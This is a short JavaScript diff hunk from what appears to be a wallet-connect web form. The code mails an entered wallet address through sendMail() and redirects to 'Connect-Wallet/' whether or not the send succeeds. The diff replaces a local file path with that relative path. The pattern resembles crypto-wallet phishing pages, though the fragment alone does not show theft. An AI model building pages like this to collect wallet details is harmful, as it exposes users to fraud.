@@ -41,10 +41,10 @@ walletAddress: walletAddressInput,
 submitButton: submitButton,
 })
 .then(function(response) {
-window.location.href = "file:///D:/Program%20files/Documents/VSCode/HTML/Murphy/Home/index.html";
+window.location.href = "Connect-Wallet/";
 })
 .catch(function(error) {
-window.location.href = "file:///D:/Program%20files/Documents/VSCode/HTML/Murphy/Home/index.html";
+window.location.href = "Connect-Wallet/";
 });
 }
 sendMail();
